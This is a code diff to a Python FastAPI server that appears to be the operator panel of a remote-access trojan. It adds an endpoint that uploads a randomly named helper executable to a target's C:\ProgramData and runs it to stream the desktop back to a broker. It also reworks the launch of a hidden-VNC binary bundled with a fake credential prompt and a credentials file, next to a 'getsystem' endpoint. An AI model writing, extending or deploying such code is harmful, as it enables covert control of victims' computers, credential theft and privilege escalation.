@@ -568,6 +568,49 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             },
         )
 
+    @app.post("/api/{session_id}/desktop")
+    async def api_desktop(request: Request, session_id: str):
+        """Upload and launch the rd-win helper on the target so the desktop tab
+        streams. The helper connects to the public rd broker (PANEL_RD_ENDPOINT)."""
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        try:
+            body = await request.json()
+        except ValueError:
+            body = {}
+        rd = Path(config.panel_bin_dir) / "rd-win.exe"
+        if not rd.is_file():
+            raise HTTPException(status_code=400, detail="rd-win.exe not built on this host")
+        token = await run_in_threadpool(broker.mint, session_id)
+        remote = str(body.get("dir") or "C:\\\\ProgramData")
+        remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
+        # unique name per launch: avoids "file in use" when a helper is already
+        # running and the operator reconnects.
+        rd_name = f"rdw-{secrets.token_hex(3)}.exe"
+        try:
+            await run_in_threadpool(
+                app.state.bridge.upload, session_id, remote, rd_name, rd.read_bytes()
+            )
+        except BridgeError as exc:
+            raise bridge_failure(exc) from exc
+        host, _, port = config.rd_endpoint.rpartition(":")
+        host = host or "127.0.0.1"
+        port = port or "8443"
+        exe = ntpath.join(remote, rd_name)
+        args = [
+            "--host", host, "--port", port,
+            "--session", session_id, "--token", token,
+        ]
+        try:
+            result = await run_in_threadpool(
+                app.state.bridge.exec, session_id, exe, args, False, True
+            )
+        except BridgeError as exc:
+            raise bridge_failure(exc) from exc
+        database.audit(str(session["actor"]), "desktop", "ok", target=session_id)
+        return JSONResponse({"ok": True, "rd_endpoint": config.rd_endpoint, "detail": result})
+
     @app.post("/api/{session_id}/getsystem")
     async def api_getsystem(request: Request, session_id: str):
         session = require(request)
@@ -673,7 +716,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if not hvnc_bin.is_file():
             raise HTTPException(status_code=400, detail="hvnc.exe not built on this host")
         token = await run_in_threadpool(broker.mint, session_id)
-        remote = body.get("dir") or "C:\\Users\\Public"
+        remote = body.get("dir") or "C:\\\\ProgramData"
         remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
         try:
             await run_in_threadpool(
@@ -698,14 +741,14 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         hvnc_path = ntpath.join(remote, "hvnc.exe")
         creds_path = ntpath.join(remote, "fleet-creds.json")
         prompt_path = ntpath.join(remote, "credprompt.exe")
-        command = (
-            f'start "" "{hvnc_path}" --host {host} --port {port} --session {session_id} '
-            f'--token {token} --desktop "{desktop}" --spawn "{spawn}" '
-            f'--creds "{creds_path}" --prompt "{prompt_path}"'
-        )
+        args = [
+            "--host", host, "--port", port, "--session", session_id,
+            "--token", token, "--desktop", desktop, "--spawn", spawn,
+            "--creds", creds_path, "--prompt", prompt_path,
+        ]
         try:
             result = await run_in_threadpool(
-                app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
+                app.state.bridge.exec, session_id, hvnc_path, args, False, True
             )
         except BridgeError as exc:
             raise bridge_failure(exc) from exc
